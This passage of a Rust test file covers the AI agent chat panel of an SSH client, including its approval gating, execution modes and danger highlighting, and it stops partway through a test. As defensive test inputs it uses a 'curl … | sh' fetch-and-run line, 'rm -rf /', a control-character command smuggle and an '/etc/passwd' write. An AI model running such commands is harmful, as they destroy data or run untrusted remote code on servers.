//! `agent_chat` 的测试：演示脚本、真实模式状态机、模式规则、链接 / 复制等纯逻辑。
//!
//! 这里不写 `use super::*`：父模块 glob 进来的 `gpui_kit::test` 会盖掉内置的
//! `#[test]` 属性宏，展开时直接撞递归上限。`started` / `real_started` 等辅助函数
//! 对 `history_tests` 可见。

use super::approval::mode_setting;
use super::demo::{DemoTool, requires_approval};
use super::model::raw_markdown_block;
use super::{
    ApprovalDetail, ApprovalState, AssistantMessage, BodyMode, ChatMessage, ChatMsg, ChatState,
    DemoInput, ExecMode, HostChoice, MARKDOWN_SAMPLE, ModelChoice, ToolCard, ToolInput, ToolStatus,
    body_markdown, body_mode, clipped_body, code_block_copy_text, content_preview,
    demo_toggle_available, host_names_label, link_click_notice, load_exec_mode, mode_is_persisted,
    mode_label, model_choices, model_label, next_model_index, save_exec_mode, selected_targets,
    start_in_real_mode, table_tsv, toggle_host_selection,
};
use crate::agent_text::{BODY_PREVIEW_CHARS, DIFF_FOLD_LIMIT, fold_diff};
use crate::agent_tools::{self, ToolRow};
use crate::i18n::t;
use serde_json::json;
use zssh_core::ai::agent::{AgentEvent, AgentModel, AgentModelCatalog};
use zssh_core::ai::bridge::{ApprovalRequest, ExecTargetReport};
use zssh_core::ai::protocol::host_target_id;
use zssh_core::ai::safety::DangerLevel;
use zssh_core::store::Database;

pub(super) fn started() -> ChatState {
    let mut state = ChatState::default();
    assert!(state.start_turn("测试一下"));
    state
}

pub(super) fn assistant(state: &ChatState) -> &AssistantMessage {
    state
        .messages
        .iter()
        .find_map(|message| match message {
            ChatMessage::Assistant(message) => Some(message),
            ChatMessage::User(_) | ChatMessage::System(_) => None,
        })
        .expect("应该有一条助手消息")
}

fn advance_n(state: &mut ChatState, count: usize, mode: ExecMode) {
    for _ in 0..count {
        assert!(state.advance(mode), "脚本应该继续推进");
    }
}

#[test]
fn read_only_and_write_tools_are_gated_by_mode() {
    assert!(requires_approval(DemoTool::TerminalExec, ExecMode::Manual));
    assert!(!requires_approval(
        DemoTool::TerminalExec,
        ExecMode::ReadOnly
    ));
    assert!(!requires_approval(DemoTool::TerminalExec, ExecMode::Auto));
    assert!(requires_approval(DemoTool::WriteFile, ExecMode::Manual));
    assert!(requires_approval(DemoTool::WriteFile, ExecMode::ReadOnly));
    assert!(!requires_approval(DemoTool::WriteFile, ExecMode::Auto));

    let mut state = started();
    advance_n(&mut state, 3, ExecMode::ReadOnly);
    assert!(
        state.pending().is_none(),
        "只读命令在只读自动模式下直接执行"
    );
    let first = &assistant(&state).tools[0];
    assert_eq!(first.approval, ApprovalState::NotRequired);
    assert_eq!(first.status, ToolStatus::Running);

    advance_n(&mut state, 4, ExecMode::ReadOnly);
    let pending = state.pending().expect("写文件在只读自动模式下仍要确认");
    assert_eq!(pending.call_id, "call-2");
    assert_eq!(pending.tool, "write_file");
}

#[test]
fn approving_both_tools_finishes_the_turn() {
    let mut state = started();
    advance_n(&mut state, 3, ExecMode::Manual);
    assert_eq!(state.pending().expect("等待第一条确认").call_id, "call-1");
    assert!(state.resolve_approval("call-1", true));
    assert!(state.pending().is_none());
    assert_eq!(assistant(&state).tools[0].approval, ApprovalState::Allowed);
    assert_eq!(assistant(&state).tools[0].status, ToolStatus::Running);

    advance_n(&mut state, 1, ExecMode::Manual);
    assert_eq!(
        assistant(&state).tools[0].output.as_deref(),
        Some("/srv/app")
    );
    assert_eq!(assistant(&state).tools[0].status, ToolStatus::Done);

    advance_n(&mut state, 3, ExecMode::Manual);
    assert_eq!(state.pending().expect("等待第二条确认").call_id, "call-2");
    assert!(state.resolve_approval("call-2", true));

    advance_n(&mut state, 1, ExecMode::Manual);
    assert_eq!(
        assistant(&state).tools[1].output.as_deref(),
        Some("已写入 12 字节")
    );
    assert_eq!(assistant(&state).tools[1].status, ToolStatus::Done);

    advance_n(&mut state, 2, ExecMode::Manual);
    assert!(!state.is_running());
    let message = assistant(&state);
    assert!(message.text.contains("目录是 /srv/app。"));
    assert!(message.text.contains("写入完成。"));
    assert!(!message.stopped);
    assert_eq!(message.tools.len(), 2);
}

#[test]
fn denying_the_first_tool_cancels_the_turn() {
    let mut state = started();
    advance_n(&mut state, 3, ExecMode::Manual);
    assert!(state.resolve_approval("call-1", false));
    assert_eq!(assistant(&state).tools[0].approval, ApprovalState::Denied);
    assert_eq!(
        assistant(&state).tools[0].error.as_deref(),
        Some("用户拒绝执行")
    );

    advance_n(&mut state, 1, ExecMode::Manual);
    advance_n(&mut state, 1, ExecMode::Manual);
    advance_n(&mut state, 1, ExecMode::Manual);
    assert!(!state.is_running());

    let message = assistant(&state);
    assert!(message.text.contains("已取消。"));
    assert_eq!(message.tools.len(), 1);
    assert_eq!(message.tools[0].status, ToolStatus::Failed);
    assert_eq!(message.tools[0].error.as_deref(), Some("用户拒绝执行"));
}

#[test]
fn denying_the_write_tool_reports_a_cancelled_write() {
    let mut state = started();
    advance_n(&mut state, 3, ExecMode::ReadOnly);
    advance_n(&mut state, 4, ExecMode::ReadOnly);
    assert_eq!(state.pending().expect("等待写文件确认").call_id, "call-2");
    assert!(state.resolve_approval("call-2", false));

    advance_n(&mut state, 1, ExecMode::ReadOnly);
    advance_n(&mut state, 1, ExecMode::ReadOnly);
    advance_n(&mut state, 1, ExecMode::ReadOnly);
    assert!(!state.is_running());

    let message = assistant(&state);
    assert!(message.text.contains("已取消写入。"));
    assert_eq!(message.tools[1].status, ToolStatus::Failed);
    assert_eq!(message.tools[1].error.as_deref(), Some("用户拒绝执行"));
}

#[test]
fn pending_approval_never_ends_the_turn() {
    let mut state = started();
    advance_n(&mut state, 3, ExecMode::Manual);
    for _ in 0..10 {
        assert!(!state.advance(ExecMode::Manual));
        assert!(state.is_running());
        assert!(state.pending().is_some());
    }
    assert_eq!(
        assistant(&state).tools[0].status,
        ToolStatus::AwaitingApproval
    );
    assert_eq!(assistant(&state).tools[0].output, None);
}

#[test]
fn stopping_resolves_pending_approval_and_marks_the_message_stopped() {
    let mut state = started();
    advance_n(&mut state, 3, ExecMode::Manual);
    assert!(state.pending().is_some());
    assert!(state.stop());

    assert!(!state.is_running());
    assert!(state.pending().is_none());
    let message = assistant(&state);
    assert!(message.stopped);
    assert_eq!(message.tools[0].approval, ApprovalState::Denied);
    assert_eq!(message.tools[0].status, ToolStatus::Stopped);
    assert_eq!(message.tools[0].error.as_deref(), Some("已停止"));
    assert!(!state.advance(ExecMode::Manual), "停止后脚本不能再推进");
}

#[test]
fn reasoning_and_text_accumulate_into_one_assistant_message() {
    let mut state = started();
    assert!(state.advance(ExecMode::Auto));
    assert!(state.advance(ExecMode::Auto));
    let message = assistant(&state);
    assert_eq!(message.reasoning, "先确认当前目录，再决定是否写入。");
    assert_eq!(message.text, "我先看一下当前目录。");
    assert!(!message.reasoning_expanded);
    assert!(state.toggle_reasoning(1));
    assert!(assistant(&state).reasoning_expanded);
    assert!(state.toggle_reasoning(1));
    assert!(!assistant(&state).reasoning_expanded);

    for _ in 0..20 {
        if !state.advance(ExecMode::Auto) {
            break;
        }
    }
    assert_eq!(state.messages.len(), 2, "文本和思考都在同一条助手消息里");
    let message = assistant(&state);
    assert!(message.text.contains("目录是 /srv/app。"));
    assert!(message.text.contains("接下来写入配置文件。"));
    assert!(message.text.contains("写入完成。"));
    assert_eq!(message.reasoning.matches("先确认当前目录").count(), 1);
}

#[test]
fn a_mode_change_only_affects_later_tool_calls() {
    let mut state = started();
    advance_n(&mut state, 3, ExecMode::Manual);
    assert_eq!(state.pending().expect("等待第一条确认").call_id, "call-1");

    // 待确认期间切到全部放行，不能把已经弹出来的确认撤掉。
    assert!(!state.advance(ExecMode::Auto));
    assert_eq!(state.pending().expect("确认还在").call_id, "call-1");

    assert!(state.resolve_approval("call-1", true));
    // 后续写文件按新切到的全部放行直接执行。
    advance_n(&mut state, 4, ExecMode::Auto);
    assert!(state.pending().is_none());
    let second = &assistant(&state).tools[1];
    assert_eq!(second.approval, ApprovalState::NotRequired);
    assert_eq!(second.status, ToolStatus::Running);
}

#[test]
fn new_conversation_clears_messages_and_stops_the_script() {
    let mut state = started();
    advance_n(&mut state, 3, ExecMode::Manual);
    state.new_conversation();

    assert!(state.messages.is_empty());
    assert!(!state.is_running());
    assert!(state.pending().is_none());
    assert!(!state.advance(ExecMode::Manual));

    assert!(state.start_turn("再来一次"));
    assert_eq!(state.messages.len(), 2);
}

fn demo_write_detail() -> ApprovalDetail {
    ApprovalDetail::new(
        DemoInput::WriteFile {
            path: "/srv/app/app.conf",
            content: "mode=prod\n",
        }
        .approval_request(),
    )
}

#[test]
fn write_approval_shows_path_and_the_full_content_as_a_diff() {
    let detail = demo_write_detail();
    let file = detail.request.file.as_ref().expect("write_file 有文件细节");
    assert_eq!(file.path, "/srv/app/app.conf");
    assert!(file.is_new);
    assert_eq!(file.diff.added, 1);
    assert!(
        file.diff
            .lines
            .iter()
            .any(|line| line.text.contains("mode=prod")),
        "差异里要有写入的内容"
    );
    assert!(
        detail.command_text().is_none(),
        "write_file 的细节在文件区，不重复显示 `write_file <路径>`"
    );
    assert_eq!(content_preview(&"x".repeat(200)).chars().count(), 81);
    // 一行摘要里换行、制表符转成可见的字面转义，不会把标题行撑成多行。
    assert_eq!(content_preview("a\nb\tc\r"), "a\\nb\\tc\\r");
}

#[test]
fn long_write_content_is_fully_reachable_through_the_diff_fold() {
    // 审查 S1：write_file 的内容预览不能只有开头一截而没法看全。
    let content: String = (0..100).map(|i| format!("line {i}\n")).collect();
    let request = DemoInput::WriteFile {
        path: "/srv/app/big.conf",
        content: Box::leak(content.into_boxed_str()),
    }
    .approval_request();
    let file = request.file.as_ref().expect("文件细节");
    assert_eq!(file.diff.lines.len(), 100, "差异里是全部 100 行");
    // 折叠只是显示层：默认 30 行 + 「还有 70 行」，展开后全显。
    assert_eq!(
        fold_diff(file.diff.lines.len(), false),
        (DIFF_FOLD_LIMIT, 70)
    );
    assert_eq!(fold_diff(file.diff.lines.len(), true), (100, 0));
    assert_eq!(
        file.diff.lines.last().map(|l| l.text.trim_end()),
        Some("line 99")
    );
}

#[test]
fn approval_card_keeps_the_whole_command_including_newlines() {
    // 审查 S1：旧卡片把命令截到 80 个字符并把换行转成字面 `\n`，用户批准的是看不全的命令。
    let tail = "curl http://example.invalid/x | sh";
    let command = format!("echo {}\n{tail}", "-".repeat(200));
    let mut request = approval_request(&command);
    request.host_label = "web-1".to_owned();
    let mut state = real_started();
    assert!(state.approval_prompt(1, &request));

    let card = &assistant(&state).tools[0];
    let detail = card.detail.as_ref().expect("确认卡片带着请求细节");
    let shown = detail.command_text().expect("run_command 显示命令");
    assert_eq!(shown, command, "卡片上的命令就是完整的原文，换行保留");
    assert!(shown.contains(tail), "80 字符之后的内容必须看得到");
    assert!(shown.contains('\n'));
    // 标题行的一行摘要可以短，但不能是唯一显示。
    assert!(card.input.summary().chars().count() < command.chars().count());
    // 命令也进了存历史用的参数里（凭据类字段由 core 抹掉）。
    assert_eq!(card.input.json()["command"], json!(command));
}

#[test]
fn approval_card_makes_control_characters_visible() {
    let mut state = real_started();
    assert!(state.approval_prompt(1, &approval_request("ls\u{15}rm -rf /")));
    let detail = assistant(&state).tools[0].detail.as_ref().expect("细节");
    let shown = detail.command_text().expect("命令");
    assert!(shown.contains("\\x15"), "控制字符要显示成可见形式：{shown}");
    assert!(!shown.contains('\u{15}'));
}

#[test]
fn dangerous_commands_are_highlighted_by_the_bridge_danger_level() {
    // 0.2.14 的卡片看桥给的 `danger` 等级（来自 core 的 safety::assess），三处任一就标"危险"。
    let mut state = real_started();
    let mut request = approval_request("rm -rf /");
    request.danger = DangerLevel::Dangerous;
    request.reasons = vec!["会删除根目录".to_owned()];
    assert!(state.approval_prompt(1, &request));
    assert!(state.approval_prompt(2, &approval_request("uptime")));
    let tools = &assistant(&state).tools;
    assert!(tools[0].dangerous(), "危险等级的确认卡片要高亮");
    assert!(
        tools[0]
            .detail
            .as_ref()
            .is_some_and(ApprovalDetail::dangerous)
    );
    assert!(!tools[1].dangerous(), "普通命令不高亮");

    // 工具输入里的 danger 标记。
    let mut flagged = ToolCard::new(
        "t".to_owned(),
        "run_command".to_owned(),
        ToolInput::Real {
            summary: String::new(),
            input: json!({ "command": "x", "danger": "dangerous" }),
        },
    );
    assert!(flagged.dangerous());
    // write_file 结果里的"写系统路径"提示（自动模式没有确认卡片也能看到）。
    flagged.input = ToolInput::Real {
        summary: String::new(),
        input: json!({ "path": "/etc/passwd" }),
    };
    assert!(!flagged.dangerous());
    flagged.output = Some("saved\ndanger: flagged as a system path (/etc)".to_owned());
    assert!(flagged.dangerous());
}

#[test]
fn exec_mode_round_trips_through_the_database() {
    // 解析用的是 core 的 `ExecMode::from_setting`，没有第二份。
    assert_eq!(ExecMode::from_setting(Some("unknown")), ExecMode::Manual);
    assert_eq!(ExecMode::from_setting(None), ExecMode::Manual);
    assert_eq!(mode_setting(ExecMode::from_setting(Some("auto"))), "auto");
    assert_eq!(mode_label(ExecMode::ReadOnly), "只读自动");

    let db = Database::open_in_memory().expect("内存库");
    let (mode, error) = load_exec_mode(&db);
    assert_eq!(mode, ExecMode::Manual);
    assert!(error.is_none());

    save_exec_mode(&db, ExecMode::ReadOnly).expect("保存执行模式");
    assert_eq!(db.ai_exec_mode().expect("读回"), "readonly");
    assert_eq!(load_exec_mode(&db).0, ExecMode::ReadOnly);
}

#[test]
fn demo_mode_changes_are_never_persisted() {
    // 审查 M2：离线演示里改「执行模式」只改内存里的演示模式，不能写设置库——
    // 设置库里的值是真实审批策略（工具桥每次执行前读它）。
    assert!(!mode_is_persisted(false));
    assert!(mode_is_persisted(true));
}

#[test]
fn only_switching_into_allow_all_asks_first() {
    use super::approval::{ModeSwitch, plan_mode_switch};
    for current in [ExecMode::Manual, ExecMode::ReadOnly] {
        assert_eq!(plan_mode_switch(current, ExecMode::Auto), ModeSwitch::Ask);
    }
    // 切到另外两种不问；已经是「全部放行」再选它也不问。
    for current in [ExecMode::Manual, ExecMode::ReadOnly, ExecMode::Auto] {
        assert_eq!(
            plan_mode_switch(current, ExecMode::Manual),
            ModeSwitch::Apply
        );
        assert_eq!(
            plan_mode_switch(current, ExecMode::ReadOnly),
            ModeSwitch::Apply
        );
    }
    assert_eq!(
        plan_mode_switch(ExecMode::Auto, ExecMode::Auto),
        ModeSwitch::Apply
    );
}

#[test]
fn cancelling_the_allow_all_question_leaves_the_setting_alone() {
    use super::{AllowAllGate, ModeSwitch};
    let db = Database::open_in_memory().expect("内存库");
    save_exec_mode(&db, ExecMode::ReadOnly).expect("先设成只读自动");

    let mut gate = AllowAllGate::default();
    assert_eq!(
        gate.request(load_exec_mode(&db).0, ExecMode::Auto),
        ModeSwitch::Ask
    );
    assert!(gate.asking(), "问着的时候没有写任何东西");
    assert_eq!(db.ai_exec_mode().expect("读回"), "readonly");

    gate.cancel();
    assert!(!gate.asking());
    assert_eq!(gate.confirm(), None, "取消后迟到的确认不算数");
    assert_eq!(db.ai_exec_mode().expect("读回"), "readonly");
}

#[test]
fn confirming_allow_all_is_the_only_way_it_gets_saved() {
    use super::{AllowAllGate, ModeSwitch};
    let db = Database::open_in_memory().expect("内存库");
    let mut gate = AllowAllGate::default();
    assert_eq!(
        gate.request(ExecMode::Manual, ExecMode::Auto),
        ModeSwitch::Ask
    );
    assert_eq!(db.ai_exec_mode().expect("读回"), "manual", "确认前不写");

    let mode = gate.confirm().expect("确认后给出要写的模式");
    assert_eq!(mode, ExecMode::Auto);
    save_exec_mode(&db, mode).expect("保存");
    assert_eq!(db.ai_exec_mode().expect("读回"), "auto");
    assert_eq!(gate.confirm(), None, "一次确认只能用一次");

    // 选另一个模式会清掉上一次没答完的问题。
    assert_eq!(
        gate.request(ExecMode::Manual, ExecMode::Auto),
        ModeSwitch::Ask
    );
    assert_eq!(
        gate.request(ExecMode::Manual, ExecMode::ReadOnly),
        ModeSwitch::Apply
    );
    assert_eq!(gate.confirm(), None);
}

// ---------------------------------------------------------------------
// 真实模式：只测纯状态和纯函数，不起进程、不读环境变量、不连网络。
// ---------------------------------------------------------------------

pub(super) fn real_started() -> ChatState {
    let mut state = ChatState::default();
    assert!(state.start_real_turn("看一下服务器"));
    state
}

pub(super) fn approval_request(command: &str) -> ApprovalRequest {
    ApprovalRequest {
        scope: "0123456789abcdef".to_owned(),
        exec_id: "exec-1".to_owned(),
        target_id: "host-1".to_owned(),
        session_id: None,
        host_label: "web-1".to_owned(),
        command: command.to_owned(),
        danger: DangerLevel::Safe,
        reasons: Vec::new(),
        file: None,
    }
}

#[test]
fn a_failed_start_takes_the_unstarted_turn_back_out_of_the_conversation() {
    let mut state = real_started();
    // real_started 已经开了一个回合（用户消息 + 空的助手消息）。
    assert_eq!(state.messages.len(), 2);
    state.discard_unstarted_turn();
    assert!(state.messages.is_empty(), "刚追加的一对要撤掉");
    assert!(!state.real_running);

    // 前面的对话不动，只撤这一轮；已经有内容的助手消息也不动。
    let mut state = ChatState::default();
    assert!(state.start_real_turn("第一句"));
    state.apply_agent_event(AgentEvent::TextDelta { text: "好".into() });
    state.apply_agent_event(AgentEvent::TurnEnd);
    assert!(state.start_real_turn("第二句"));
    state.discard_unstarted_turn();
    assert_eq!(state.messages.len(), 2, "只剩第一句和它的回复");
    assert!(state.start_real_turn("第三句"));
    state.apply_agent_event(AgentEvent::TextDelta {
        text: "半截".into(),
    });
    state.discard_unstarted_turn();
    assert_eq!(
        state.messages.len(),
        4,
        "有内容的助手消息不能被当成没开始的回合撤掉"
    );
}

#[test]
fn real_text_and_reasoning_accumulate_into_the_active_message() {
    let mut state = real_started();
    assert!(state.is_running(), "真实回合不依赖演示脚本");

    state.apply_agent_event(AgentEvent::ReasoningDelta {
        text: "先看目录".to_owned(),
    });
    state.apply_agent_event(AgentEvent::TextDelta {
        text: "好的".to_owned(),
    });
    state.apply_agent_event(AgentEvent::TextDelta {
        text: "我看一下。".to_owned(),
    });

    let message = assistant(&state);
    assert_eq!(message.reasoning, "先看目录");
    assert_eq!(message.text, "好的我看一下。");
    assert!(state.is_running());

    state.apply_agent_event(AgentEvent::TurnEnd);
    assert!(!state.is_running());
    assert_eq!(state.messages.len(), 2, "正文都落在同一条助手消息里");
    assert!(!assistant(&state).stopped);
}

#[test]
fn real_tool_start_and_end_update_one_card() {
    let mut state = real_started();
    state.apply_agent_event(AgentEvent::ToolStart {
        call_id: "toolu_1".to_owned(),
        tool: "run_command".to_owned(),
        input: json!({ "command": "uptime" }),
    });

    let card = &assistant(&state).tools[0];
    assert_eq!(card.call_id, "toolu_1");
    assert_eq!(card.tool, "run_command");
    assert_eq!(card.status, ToolStatus::Running);
    assert_eq!(card.approval, ApprovalState::NotRequired);
    assert!(card.input.summary().contains("uptime"));

    state.apply_agent_event(AgentEvent::ToolEnd {
        call_id: "toolu_1".to_owned(),
        tool: "run_command".to_owned(),
        output: "up 3 days".to_owned(),
        error: false,
    });
    let card = &assistant(&state).tools[0];
    assert_eq!(card.status, ToolStatus::Done);
    assert_eq!(card.output.as_deref(), Some("up 3 days"));
    assert!(card.error.is_none());

    state.apply_agent_event(AgentEvent::ToolStart {
        call_id: "toolu_2".to_owned(),
        tool: "run_command".to_owned(),
        input: json!({ "command": "false" }),
    });
    state.apply_agent_event(AgentEvent::ToolEnd {
        call_id: "toolu_2".to_owned(),
        tool: "run_command".to_owned(),
        output: "命令失败".to_owned(),
        error: true,
    });
    let card = &assistant(&state).tools[1];
    assert_eq!(card.status, ToolStatus::Failed);
    assert_eq!(card.error.as_deref(), Some("命令失败"));
    assert!(card.output.is_none());
}

#[test]
fn real_approval_stays_pending_until_answered() {
    let mut state = real_started();
    let request = approval_request("rm -rf /tmp/build");
    assert!(state.approval_prompt(7, &request));

    let card = &assistant(&state).tools[0];
    assert_eq!(card.approval, ApprovalState::Pending);
    assert_eq!(card.status, ToolStatus::AwaitingApproval);
    assert_eq!(card.tool, "run_command");
    assert!(
        card.detail
            .as_ref()
            .and_then(ApprovalDetail::command_text)
            .is_some_and(|text| text.contains("rm -rf /tmp/build")),
        "确认卡片要显示命令原文"
    );
    assert_eq!(state.real_approval("approval-7"), Some(7));

    assert!(state.resolve_real_approval("approval-7", true, true));
    let card = &assistant(&state).tools[0];
    assert_eq!(card.approval, ApprovalState::Allowed);
    assert_eq!(card.status, ToolStatus::Answered);
    assert!(state.real_approval("approval-7").is_none());
}

#[test]
fn turn_end_with_a_pending_approval_never_shows_done() {
    let mut state = real_started();
    assert!(state.approval_prompt(3, &approval_request("touch /srv/app.conf")));
    state.apply_agent_event(AgentEvent::TurnEnd);

    assert!(!state.is_running());
    let card = &assistant(&state).tools[0];
    assert_eq!(card.approval, ApprovalState::Denied);
    assert_eq!(card.status, ToolStatus::Failed);
    assert!(
        card.error
            .as_deref()
            .is_some_and(|error| error.contains("未确认")),
        "待确认在回合结束时必须看起来没完成：{:?}",
        card.error
    );
}

// ---------------------------------------------------------------------
// V2-G10b：执行位置回报、分组、思考指示
// ---------------------------------------------------------------------

fn tool_start(call_id: &str, command: &str) -> AgentEvent {
    AgentEvent::ToolStart {
        call_id: call_id.to_owned(),
        tool: "mcp__zssh__run_command".to_owned(),
        input: json!({ "command": command }),
    }
}

fn tool_end(call_id: &str, output: &str) -> AgentEvent {
    AgentEvent::ToolEnd {
        call_id: call_id.to_owned(),
        tool: "mcp__zssh__run_command".to_owned(),
        output: output.to_owned(),
        error: false,
    }
}

fn exec_report(
    exec_id: &str,
    command: &str,
    target: &str,
    session: Option<&str>,
) -> ExecTargetReport {
    ExecTargetReport {
        scope: "s".to_owned(),
        exec_id: exec_id.to_owned(),
        tool: "run_command".to_owned(),
        key: command.to_owned(),
        target_id: target.to_owned(),
        session_id: session.map(str::to_owned),
        host_label: if target == "host-2" { "db-1" } else { "web-1" }.to_owned(),
    }
}

#[test]
fn a_report_labels_the_card_and_the_result_marker_is_stripped() {
    let mut state = real_started();
    state.apply_agent_event(tool_start("c1", "uptime"));
    state.apply_report(exec_report("e1", "uptime", "host-1", Some("term-3")), true);
    let card = &assistant(&state).tools[0];
    let exec = card.exec.as_ref().expect("回报配到了卡片上");
    assert_eq!(exec.label, "web-1");
    assert_eq!(exec.session_id.as_deref(), Some("term-3"));
    assert!(card.exec_multi, "有多个目标：卡片上要标主机名");

    state.apply_agent_event(tool_end(
        "c1",
        "exit_code: 0\nlocation: terminal\nstdout:\nok\n[zssh exec e1]",
    ));
    let card = &assistant(&state).tools[0];
    let output = card.output.as_deref().expect("有输出");
    assert!(
        !output.contains("[zssh exec"),
        "卡片上不显示编号标记：{output}"
    );
    assert!(output.contains("location: terminal"));
    assert_eq!(card.status, ToolStatus::Done);
    assert!(!state.target_unknown(card), "配上了就不是「未确定」");
}

#[test]
fn two_identical_commands_are_told_apart_by_the_exec_id_in_their_results() {
    let mut state = real_started();
    state.apply_agent_event(tool_start("web", "uptime"));
    state.apply_agent_event(tool_start("db", "uptime"));
    // 回报先到，按先后临时配：e1 → web，e2 → db。
    state.apply_report(exec_report("e1", "uptime", "host-1", None), true);
    state.apply_report(exec_report("e2", "uptime", "host-2", None), true);
    let labels = |state: &ChatState| -> Vec<String> {
        assistant(state)
            .tools
            .iter()
            .map(|card| {
                card.exec
                    .as_ref()
                    .map(|e| e.label.clone())
                    .unwrap_or_default()
            })
            .collect()
    };
    assert_eq!(labels(&state), vec!["web-1", "db-1"]);
    // db 先返回，结果里写着它其实是 e1：以编号为准，两张对调。
    state.apply_agent_event(tool_end("db", "stdout:\nx\n[zssh exec e1]"));
    assert_eq!(labels(&state), vec!["db-1", "web-1"]);
}

#[test]
fn a_report_that_arrives_before_its_card_waits_and_stale_ones_are_dropped() {
    let mut state = real_started();
    state.apply_report(exec_report("e1", "uptime", "host-1", None), false);
    assert!(assistant(&state).tools.is_empty());
    state.apply_agent_event(tool_start("c1", "uptime"));
    assert_eq!(
        assistant(&state).tools[0]
            .exec
            .as_ref()
            .map(|e| e.exec_id.clone()),
        Some("e1".to_owned()),
        "卡片出现时认领先到的回报"
    );
    // 回合结束时没人认领的回报作废，不去认领下一回合同名的调用。
    state.apply_report(exec_report("e2", "df", "host-1", None), false);
    state.apply_agent_event(AgentEvent::TurnEnd);
    let mut state = state;
    assert!(state.start_real_turn("再来"));
    state.apply_agent_event(tool_start("c2", "df"));
    let last = match state.messages.last() {
        Some(ChatMessage::Assistant(message)) => message,
        _ => panic!("要有助手消息"),
    };
    assert!(
        last.tools[0].exec.is_none(),
        "上一回合遗留的回报不能认领这一回合的卡片"
    );
}

#[test]
fn a_finished_call_without_any_report_says_the_target_is_unknown() {
    let mut state = real_started();
    state.apply_agent_event(tool_start("c1", "uptime"));
    assert!(
        !state.target_unknown(&assistant(&state).tools[0]),
        "还在执行：先别急着说未确定"
    );
    state.apply_agent_event(tool_end("c1", "exit_code: 0"));
    assert!(state.target_unknown(&assistant(&state).tools[0]));
    // 列表工具不带目标，不算。
    state.apply_agent_event(AgentEvent::ToolStart {
        call_id: "c2".to_owned(),
        tool: "mcp__zssh__list_targets".to_owned(),
        input: json!({}),
    });
    state.apply_agent_event(AgentEvent::ToolEnd {
        call_id: "c2".to_owned(),
        tool: "mcp__zssh__list_targets".to_owned(),
        output: "1 target(s)".to_owned(),
        error: false,
    });
    assert!(!state.target_unknown(&assistant(&state).tools[1]));
}

#[test]
fn the_approval_card_already_knows_where_the_command_will_run() {
    let mut state = real_started();
    let mut request = approval_request("systemctl restart nginx");
    request.session_id = Some("term-2".to_owned());
    assert!(state.approval_prompt(9, &request));
    let card = &assistant(&state).tools[0];
    let exec = card.exec.as_ref().expect("审批请求自带执行位置");
    assert_eq!(
        (exec.label.as_str(), exec.session_id.as_deref()),
        ("web-1", Some("term-2"))
    );
    assert!(card.exec_multi);
}

#[test]
fn waiting_and_running_cards_are_never_folded_into_a_group() {
    let mut state = real_started();
    state.apply_agent_event(tool_start("c1", "uptime"));
    state.apply_agent_event(tool_end("c1", "exit_code: 0\nstdout:\nok\n"));
    state.apply_agent_event(tool_start("c2", "df -h"));
    state.apply_agent_event(tool_end("c2", "exit_code: 2\nstdout:\n\n"));
    assert!(state.approval_prompt(1, &approval_request("rm -rf /tmp/x")));
    state.apply_agent_event(tool_start("c3", "rm -rf /tmp/x"));

    let message = assistant(&state);
    let views: Vec<_> = message.tools.iter().map(ToolCard::view).collect();
    assert!(views[1].failed, "退出码不是 0 算失败");
    assert!(!views[0].failed);
    let rows = agent_tools::group_calls(&views);
    // 前两张已完成的并成一组；等批准的确认卡片单独成卡；正在执行的只一行进行中。
    assert_eq!(
        rows,
        vec![
            ToolRow::Group(vec![0, 1]),
            ToolRow::Card(2),
            ToolRow::Progress(3),
        ]
    );

    // 回合在批准还没回答时结束：确认卡片被标成失败，不会显示成完成，更不会被折叠隐藏掉待批准状态。
    let mut stopped = real_started();
    assert!(stopped.approval_prompt(2, &approval_request("reboot")));
    assert_eq!(
        agent_tools::group_calls(
            &assistant(&stopped)
                .tools
                .iter()
                .map(ToolCard::view)
                .collect::<Vec<_>>()
        ),
        vec![ToolRow::Card(0)]
    );
    stopped.apply_agent_event(AgentEvent::TurnEnd);
    let card = &assistant(&stopped).tools[0];
    assert_eq!(card.status, ToolStatus::Failed);
    assert!(card.view().is_approval && card.view().failed);
}

#[test]
fn thinking_shows_between_steps_and_not_while_text_or_a_command_is_moving() {
    let mut state = ChatState::default();
    assert!(!state.thinking_visible(), "没有回合");
    assert!(state.start_real_turn("你好"));
    assert!(state.thinking_visible(), "刚发出问题");
    state.apply_agent_event(AgentEvent::TextDelta {
        text: "我先看".to_owned(),
    });
    assert!(!state.thinking_visible(), "字在出");
    state.apply_agent_event(tool_start("c1", "uptime"));
    assert!(!state.thinking_visible(), "命令在跑");
    state.apply_agent_event(tool_end("c1", "exit_code: 0"));
    assert!(state.thinking_visible(), "命令结束，AI 在想下一步");
    assert!(state.approval_prompt(3, &approval_request("reboot")));
    assert!(!state.thinking_visible(), "等批准");
    state.apply_agent_event(AgentEvent::Retrying {
        attempt: 1,
        reason: "限流".to_owned(),
        next_in_secs: None,
    });
    assert!(state.retry.is_some());
    state.apply_agent_event(AgentEvent::TurnEnd);
    assert!(!state.thinking_visible());
    assert!(state.retry.is_none() && state.turn_started.is_none());
}

#[test]
fn a_new_conversation_forgets_every_pairing_and_thinking_state() {
    let mut state = real_started();
    state.apply_agent_event(tool_start("c1", "uptime"));
    state.apply_report(exec_report("e1", "uptime", "host-1", None), true);
    state.apply_report(exec_report("e2", "never", "host-1", None), true);
    state.new_conversation();
    assert!(state.tracked.is_empty() && state.reports.is_empty() && state.unclaimed.is_empty());
    assert!(state.report_multi.is_empty() && state.last_item.is_none());
    assert!(!state.thinking_visible());
}

#[test]
fn expired_real_approval_marks_the_card_failed() {
    let mut state = real_started();
    assert!(state.approval_prompt(5, &approval_request("uptime")));
    assert!(state.resolve_real_approval("approval-5", true, false));

    let card = &assistant(&state).tools[0];
    assert_eq!(card.approval, ApprovalState::Denied);
    assert_eq!(card.status, ToolStatus::Failed);
    assert!(card.error.is_some());
}

#[test]
fn real_notices_are_visible_and_marked() {
    let mut state = real_started();
    state.apply_agent_event(AgentEvent::Retrying {
        attempt: 2,
        reason: "限流".to_owned(),
        next_in_secs: Some(3),
    });
    // 0.2.14：重试提示放在「思考中」旁边，不往消息里堆提示。
    let retry = state.retry.clone().expect("重试提示");
    let text = agent_tools::retry_text(&retry);
    assert!(text.contains("第 2 次") && text.contains("限流") && text.contains("3 秒"));
    assert!(assistant(&state).notices.is_empty());
    // 又出字了：重试成功，提示消失。
    state.apply_agent_event(AgentEvent::TextDelta {
        text: "好".to_owned(),
    });
    assert!(state.retry.is_none());
    state.apply_agent_event(AgentEvent::Error {
        message: "连接失败".to_owned(),
    });
